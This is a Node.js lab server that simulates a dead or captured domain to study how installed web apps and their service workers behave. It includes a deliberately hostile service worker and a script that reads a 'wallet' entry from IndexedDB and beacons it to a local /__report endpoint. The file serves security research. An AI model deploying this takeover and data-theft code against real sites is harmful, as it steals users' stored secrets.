// SW survival lab (2026-10-07). What an installed web app survives when its domain dies or is captured.
// node server.mjs 8899 & ; node chrome.mjs <pwa/node_modules>   — Chrome (playwright-core, installed Chrome)
// for p in 8901..8906: node server.mjs $p & ; SIM_UDID=<booted iOS simulator> bash ios.sh — iOS Safari
// Results (Chrome 154 and iOS 27 Safari, identical): down/404/parking -> app and data kept;
// different 200 JS sw.js -> replaced, new code reads IndexedDB; Clear-Site-Data "storage" -> app and data wiped.
// SW survival lab: one origin whose server can misbehave like a dead or hijacked domain.
import http from 'node:http';
import fs from 'node:fs';
const port = Number(process.argv[2] || 8899);
let mode = 'normal';
const reports = [];
const SW = (tag) => `// sw ${tag}
self.addEventListener('install', e => e.waitUntil((async () => {
  const c = await caches.open('app-v1');
  await c.addAll(['./', './index.html', './app.js']);
  await self.skipWaiting();
})()));
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', e => {
  const u = new URL(e.request.url);
  if (u.pathname.startsWith('/__')) return;
  e.respondWith(caches.match(e.request, { ignoreSearch: true }).then(r => r || fetch(e.request)));
});
self.SW_TAG = '${tag}';
`;
const HOSTILE_SW = `// HOSTILE sw
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', e => {
  const u = new URL(e.request.url);
  if (u.pathname.startsWith('/__')) return;
  if (e.request.mode === 'navigate') e.respondWith(new Response('<!doctype html><title>hostile</title><h1>HOSTILE PAGE</h1><script src="/__hostile.js"></script>', { headers: { 'Content-Type': 'text/html' } }));
});
`;
const INDEX = fs.readFileSync(new URL('./index.html', import.meta.url));
const APP = fs.readFileSync(new URL('./app.js', import.meta.url));
http.createServer((req, res) => {
  const u = new URL(req.url, 'http://localhost');
  const p = u.pathname;
  if (p === '/__mode') { mode = u.searchParams.get('m'); console.log('MODE', mode); res.end('ok ' + mode); return; }
  if (p === '/__report') { let b = ''; req.on('data', d => b += d); req.on('end', () => { reports.push(b); console.log('REPORT', b); res.end('ok'); }); return; }
  if (p === '/__reports') { res.setHeader('Content-Type', 'application/json'); res.end(JSON.stringify(reports)); return; }
  if (p === '/__hostile.js') { res.setHeader('Content-Type', 'text/javascript'); res.end(`indexedDB.open('lab',1).onsuccess=e=>{const db=e.target.result;try{db.transaction('kv').objectStore('kv').get('wallet').onsuccess=x=>navigator.sendBeacon('/__report',JSON.stringify({ua:navigator.userAgent.slice(0,40),hostile:true,stole:x.target.result||null}))}catch(err){navigator.sendBeacon('/__report',JSON.stringify({hostile:true,stole:null,err:String(err)}))}}`); return; }
  console.log(mode, req.method, p);
  if (mode === 'down') { req.socket.destroy(); return; }
  if (mode === '404') { res.statusCode = 404; res.end('not found'); return; }
  if (mode === 'parking') { res.setHeader('Content-Type', 'text/html'); res.end('<!doctype html><h1>This domain is for sale</h1>'); return; }
  if (mode === 'csd-404') { res.statusCode = 404; res.setHeader('Clear-Site-Data', '"cache", "storage"'); res.end('gone'); return; }
  if (p === '/sw.js') {
    res.setHeader('Content-Type', 'text/javascript'); res.setHeader('Cache-Control', 'no-cache');
    if (mode === 'hostile') { res.end(HOSTILE_SW); return; }
    if (mode === 'csd-storage') res.setHeader('Clear-Site-Data', '"storage"');
    res.end(SW('v1')); return;
  }
  if (p === '/' || p === '/index.html') { res.setHeader('Content-Type', 'text/html'); res.end(INDEX); return; }
  if (p === '/app.js') { res.setHeader('Content-Type', 'text/javascript'); res.end(APP); return; }
  res.statusCode = 404; res.end();
}).listen(port, '127.0.0.1', () => console.log('lab on', port));
